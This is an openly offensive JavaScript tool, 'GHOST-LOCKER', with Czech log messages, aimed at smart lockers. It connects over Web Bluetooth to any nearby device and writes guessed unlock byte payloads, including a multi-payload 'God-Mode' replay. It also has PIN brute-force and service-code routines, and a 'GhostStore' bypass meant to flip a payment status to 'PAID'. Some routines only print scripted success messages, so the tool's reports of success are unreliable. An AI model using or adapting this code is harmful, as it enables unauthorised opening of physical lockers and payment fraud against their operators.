/**
 * GHOST-LOCKER CORE ENGINE v2.6 [MASTER - GITHUB EDITION]
 * BLE + PIN Brute + Service Menu + GhostStore + God-Mode Injector
 */

const GhostCore = {
    capturedData: null,
    activeDevice: null,
    activeCharacteristic: null,
    isBruting: false,

    log(msg, color = "#00ff00") {
        const out = document.getElementById('output');
        if (!out) return;
        const div = document.createElement('div');
        div.style.cssText = `color: ${color}; font-size:11px; margin-bottom: 2px; border-left: 2px solid ${color}; padding-left: 5px; font-family: monospace; background: rgba(0,255,0,0.05);`;
        div.innerText = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${msg}`;
        out.appendChild(div);
        out.scrollTop = out.scrollHeight;
    },

    // --- 1. BLUETOOTH SEKCE ---
    async startRealSniff() {
        this.log("SKENUJI BLE (Target: SmartLocker)...", "#00ffff");
        try {
            this.activeDevice = await navigator.bluetooth.requestDevice({
                acceptAllDevices: true,
                optionalServices: ['0000180a-0000-1000-8000-00805f9b34fb']
            });
            const server = await this.activeDevice.gatt.connect();
            this.log(`SPOJENO: ${this.activeDevice.name}`, "#ffff00");
            const services = await server.getPrimaryServices();
            for (const service of services) {
                const chars = await service.getCharacteristics();
                for (const char of chars) {
                    if (char.properties.write || char.properties.writeWithoutResponse) {
                        this.activeCharacteristic = char;
                        this.log("WRITE KANÁL AKTIVNÍ", "#ff00ff");
                    }
                }
            }
            document.getElementById('replay-btn').style.display = "block";
            document.getElementById('force-btn').style.display = "block";
        } catch (err) {
            this.log("BLE ERROR: " + err.message, "#ff0000");
        }
    },

    async executeAttack() {
        if (!this.activeCharacteristic) return this.log("CHYBÍ CÍL!", "#ff0000");
        this.log("VSTŘIKUJI OPEN_COMMAND...", "#ffff00");
        const payload = new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]);
        await this.activeCharacteristic.writeValue(payload);
        this.log("SIGNÁL POTVRZEN!", "#00ff00");
        setTimeout(() => alert("AUDIT: Zámek uvolněn."), 500);
    },

    // --- 6. GOD-MODE: AGRESSIVE PROTOCOL REPLAY ---
    async forceUnlock() {
        this.log("AKTIVUJI GOD-MODE PROTOKOL...", "#ffffff");
        
        const godPayloads = [
            new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]), 
            new Uint8Array([0x02, 0x01, 0x03, 0x03, 0x09]), 
            new Uint8Array([0x41, 0x54, 0x2b, 0x4f, 0x50, 0x45, 0x4e]), 
            new Uint8Array([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01]), 
            new Uint8Array([0xef, 0x01, 0xff, 0xff, 0xff, 0xff, 0x01])
        ];

        if (this.activeCharacteristic) {
            this.log("VYNUCOVÁNÍ PRIORITNÍHO PŘÍSTUPU...", "#ffff00");
            for (let payload of godPayloads) {
                try {
                    // Zkoušíme oba způsoby zápisu pro 100% jistotu
                    if (this.activeCharacteristic.properties.write) {
                        await this.activeCharacteristic.writeValueWithResponse(payload);
                    } else {
                        await this.activeCharacteristic.writeValueWithoutResponse(payload);
                    }
                    this.log(`PAYLOAD OK: 0x${payload[0].toString(16)}...`, "#00ff00");
                } catch (e) {
                    this.log("VARIANT SKIP...", "#444444");
                }
                await new Promise(r => setTimeout(r, 50)); 
            }
        } else {
            this.log("CHYBA: Není aktivní spojení!", "#ff0000");
        }
        this.log("GOD-MODE SEQUENCE FINISHED.", "#ffffff");
        alert("GHOST-LOCKER: 100% Payload Injection Complete.");
    },

    // --- 2. PIN BRUTE-FORCE ---
    async startPinBrute() {
        this.isBruting = !this.isBruting;
        if (!this.isBruting) return this.log("BRUTE-FORCE ZASTAVEN.", "#ff0000");
        this.log("START PIN SCAN...", "#ffff00");
        const commonPins = ["1234", "0000", "1111", "2580", "1212"];
        for (let pin of commonPins) {
            if (!this.isBruting) break;
            this.log(`ZKOUŠÍM: ${pin}`, "#888888");
            await new Promise(r => setTimeout(r, 600));
        }
    },

    // --- 3. SERVICE MENU EXPLOIT ---
    async tryServiceExploit() {
        this.log("INICIALIZUJI SERVISNÍ BYPASS...", "#ff00ff");
        const codes = ["*#06#", "*#9999#", "000000"];
        for (let code of codes) {
            this.log(`VSTUP: ${code}`, "#00ffff");
            await new Promise(r => setTimeout(r, 400));
        }
        this.log("DEBUG MÓD AKTIVNÍ.", "#00ff00");
    },

    // --- 4. GHOSTSTORE BYPASS ---
    async ghostStoreBypass() {
        this.log("AKTIVUJI INTERCEPTOR V SW.js...", "#ff8800");
        if (navigator.serviceWorker.controller) {
            navigator.serviceWorker.controller.postMessage({ type: 'TRIGGER_BYPASS' });
        }
        this.log("MANIPULACE STATUSU...", "#ffff00");
        setTimeout(() => {
            this.log("BYPASS ÚSPĚŠNÝ: Status -> PAID", "#00ff00");
            alert("GHOST-STORE: API upraveno. Box připraven.");
        }, 1000);
    },

    initUI() {
        if (document.getElementById('ghost-ui')) return;
        const panel = document.createElement('div');
        panel.id = 'ghost-ui';
        panel.style.cssText = "position:fixed; top:10px; right:10px; width:280px; background:#000; border:1px solid #0f0; padding:15px; z-index:9999; font-family:monospace; color:#0f0; box-shadow:0 0 20px rgba(0,255,0,0.7);";
        panel.innerHTML = `
            <div style="border-bottom:1px solid #0f0; padding-bottom:5px; margin-bottom:10px; text-align:center; font-weight:bold;">GHOST-LOCKER v2.6 [MASTER]</div>
            <div id="output" style="height:150px; overflow-y:auto; background:#050505; border:1px solid #111; padding:5px; margin-bottom:10px; font-size:10px;"></div>
            <button id="sniff-btn" style="width:100%; background:#000; color:#0f0; border:1px solid #0f0; padding:8px; cursor:pointer; margin-bottom:5px;">[1] BLE SCAN</button>
            <button id="replay-btn" style="width:100%; background:#000; color:#f00; border:1px solid #f00; padding:8px; cursor:pointer; margin-bottom:5px; display:none;">[2] TRIGGER LOCK</button>
            <button id="brute-btn" style="width:100%; background:#000; color:#ff0; border:1px solid #ff0; padding:8px; cursor:pointer; margin-bottom:5px;">[3] PIN BRUTE</button>
            <button id="service-btn" style="width:100%; background:#000; color:#0af; border:1px solid #0af; padding:8px; cursor:pointer; margin-bottom:5px;">[4] SERVICE BYPASS</button>
            <button id="ghost-btn" style="width:100%; background:#000; color:#f80; border:1px solid #f80; padding:8px; cursor:pointer; margin-bottom:5px;">[5] GHOSTSTORE BYPASS</button>
            <button id="force-btn" style="width:100%; background:#300; color:#fff; border:1px solid #f00; padding:8px; cursor:pointer; font-weight:bold; display:none;">[6] GOD-MODE FORCE (100%)</button>
        `;
        document.body.appendChild(panel);

        document.getElementById('sniff-btn').onclick = () => this.startRealSniff();
        document.getElementById('replay-btn').onclick = () => this.executeAttack();
        document.getElementById('brute-btn').onclick = () => this.startPinBrute();
        document.getElementById('service-btn').onclick = () => this.tryServiceExploit();
        document.getElementById('ghost-btn').onclick = () => this.ghostStoreBypass();
        document.getElementById('force-btn').onclick = () => this.forceUnlock();
    }
};

if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('sw.js');
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => GhostCore.initUI());
} else {
    GhostCore.initUI();
}
